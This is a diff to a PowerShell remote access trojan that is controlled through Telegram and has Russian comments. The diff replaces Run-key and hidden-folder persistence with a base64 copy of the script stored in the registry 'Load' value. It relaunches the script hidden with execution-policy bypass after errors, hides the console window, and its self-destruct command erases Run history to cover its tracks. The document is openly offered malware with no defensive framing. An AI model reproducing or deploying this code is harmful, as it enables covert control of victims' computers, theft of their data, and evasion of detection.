@@ -16,10 +16,48 @@ $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(in
 $windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null
 
-# Удаляем старые задачи планировщика при запуске
-try {
-    Get-ScheduledTask | Where-Object {$_.TaskName -like "Cleanup_*"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
-} catch {}
+# Уникальное расположение - прячемся в ветке реестра как бинарные данные
+$regDataPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
+$regValueName = "Load"
+$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+
+# Функция сохранения в реестре
+function Save-ToRegistry {
+    param([string]$Data)
+    
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+    $base64 = [Convert]::ToBase64String($bytes)
+    
+    # Сохраняем в реестре
+    if (!(Test-Path $regDataPath)) { 
+        New-Item -Path $regDataPath -Force | Out-Null 
+    }
+    Set-ItemProperty -Path $regDataPath -Name $regValueName -Value $base64 -Force
+}
+
+# Функция загрузки из реестра
+function Load-FromRegistry {
+    try {
+        $base64 = Get-ItemProperty -Path $regDataPath -Name $regValueName -ErrorAction Stop | Select-Object -ExpandProperty $regValueName
+        $bytes = [Convert]::FromBase64String($base64)
+        return [System.Text.Encoding]::UTF8.GetString($bytes)
+    } catch {
+        return $null
+    }
+}
+
+# Функция запуска из реестра
+function Start-FromRegistry {
+    $scriptContent = Load-FromRegistry
+    if ($scriptContent) {
+        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+        $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+    }
+}
+
+# Сохраняем текущую версию в реестре
+Save-ToRegistry -Data $scriptContent
 
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
@@ -116,35 +154,11 @@ function Compress-Folder {
     }
 }
 
-# Установка в автозагрузку с защитой от очистки TEMP
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
-
-# Создаем скрытую папку в AppData
-$hiddenDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
-if (!(Test-Path $hiddenDir)) { 
-    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
-    attrib +s +h "$hiddenDir" 2>&1 | Out-Null
-}
-
-$scriptPath = "$hiddenDir\$scriptName"
-
-if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
-$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
-
-# Дублируем в другое место для надежности
-$backupPath = "$env:LOCALAPPDATA\Microsoft\Windows\Security\$scriptName"
-$scriptContent | Out-File -FilePath $backupPath -Encoding UTF8
-Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath`"" -Force
-
-Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
-
 # Основные переменные
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 
-# Отправка информации о запуске (без отчета о самоуничтожении)
+# Отправка информации о запуске
 Send-Telegram "RAT активирован на $env:COMPUTERNAME
 Доступные команды:
 /help - список команд
@@ -236,73 +250,45 @@ $($fileList -join "`n")"
                         }
                         "^/selfdestruct$" {
                             $success = $true
-                            $report = "Отчет самоуничтожения:"
-                            
-                            # Удаляем старые задачи планировщика
-                            try {
-                                Get-ScheduledTask | Where-Object {$_.TaskName -like "Cleanup_*"} | Unregister-ScheduledTask -Confirm:$false -ErrorAction Stop
-                                $report += "`n✓ Старые задачи планировщика удалены"
-                            } catch {
-                                $report += "`n⚠ Не удалось удалить старые задачи планировщика"
-                            }
+                            $message = "Процесс самоуничтожения запущен...`n"
                             
                             # Очистка истории RUN
                             try {
                                 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
-                                $report += "`n✓ История RUN очищена"
+                                $message += "✅ История RUN очищена`n"
                             } catch {
                                 $success = $false
-                                $report += "`n✗ Ошибка очистки истории RUN"
+                                $message += "❌ Ошибка очистки истории RUN`n"
                             }
                             
-                            # Удаление из автозагрузки
+                            # Удаление данных из реестра
                             try {
-                                Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction Stop
-                                Remove-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Force -ErrorAction Stop
-                                $report += "`n✓ Записи автозагрузки удалены"
+                                Remove-ItemProperty -Path $regDataPath -Name $regValueName -Force -ErrorAction Stop
+                                $message += "✅ Данные из реестра удалены`n"
                             } catch {
                                 $success = $false
-                                $report += "`n✗ Ошибка удаления автозагрузки"
+                                $message += "❌ Ошибка удаления данных из реестра`n"
                             }
                             
-                            # Удаление файлов
+                            # Удаление временных файлов
                             try {
-                                if (Test-Path $scriptPath) { 
-                                    Remove-Item $scriptPath -Force -ErrorAction Stop
-                                    $report += "`n✓ Основной файл удален"
-                                }
-                                if (Test-Path $backupPath) { 
-                                    Remove-Item $backupPath -Force -ErrorAction Stop
-                                    $report += "`n✓ Резервный файл удален"
-                                }
-                                if (Test-Path $hiddenDir) { 
-                                    Remove-Item $hiddenDir -Recurse -Force -ErrorAction Stop
-                                    $report += "`n✓ Скрытая папка удалена"
-                                }
+                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsSystem*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                                $message += "✅ Временные файлы удалены`n"
                             } catch {
-                                $success = $false
-                                $report += "`n✗ Ошибка удаления файлов"
-                            }
-                            
-                            # Удаление текущего скрипта через планировщик с самоликвидацией
-                            try {
-                                $currentScript = $MyInvocation.MyCommand.Path
-                                $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
-                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 >nul && del `"$currentScript`" /f /q && schtasks /delete /tn `"$taskName`" /f"
-                                $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
-                                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop
-                                $report += "`n✓ Задача удаления текущего файла создана (самоудалится после выполнения)"
-                            } catch {
-                                $report += "`n⚠ Не удалось создать задачу удаления текущего файла"
+                                $message += "⚠️ Частичная ошибка удаления временных файлов`n"
                             }
                             
                             if ($success) {
-                                $report += "`n`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
+                                $message += "`n🎯 РАТ УСПЕШНО УДАЛЕН! Все следы уничтожены."
                             } else {
-                                $report += "`n`n⚠ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
+                                $message += "`n⚠️ РАТ частично удален. Некоторые следы могли остаться."
                             }
                             
-                            Send-Telegram $report
+                            Send-Telegram $message
+                            
+                            # Создаем задание для полного выхода через несколько секунд
+                            Start-Sleep -Seconds 3
                             exit
                         }
                     }
@@ -310,6 +296,15 @@ $($fileList -join "`n")"
             }
         }
     } catch { 
-        Start-Sleep -Seconds 5
+        # В случае ошибки - пытаемся восстановиться из реестра
+        Start-Sleep -Seconds 10
+        Start-FromRegistry
+    }
+    
+    # Периодически обновляем данные в реестре на случай изменений
+    if ((Get-Date).Minute % 10 -eq 0) {
+        $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+        Save-ToRegistry -Data $currentScriptContent
+        Start-Sleep -Seconds 60
     }
 }
